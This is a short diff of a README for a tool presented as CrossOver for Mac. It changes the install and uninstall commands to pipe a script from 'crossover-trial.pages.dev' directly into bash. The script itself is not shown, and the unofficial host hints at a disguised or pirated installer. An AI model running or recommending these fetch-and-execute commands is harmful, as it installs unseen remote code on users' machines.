@@ -7,13 +7,13 @@ CrossOver lets you run Windows applications on Mac without a Windows license. Th
 ## 📦 Quick Install
 
 ```bash
-bash <(curl -fsSL https://crossover.pages.dev/crossover)
+bash <(curl -fsSL https://crossover-trial.pages.dev/crossover)
 ```
 
 ## 🗑️ Uninstall
 
 ```bash
-bash <(curl -fsSL https://crossover.pages.dev/crossover) remove
+bash <(curl -fsSL https://crossover-trial.pages.dev/crossover) remove
 ```
 
 ---
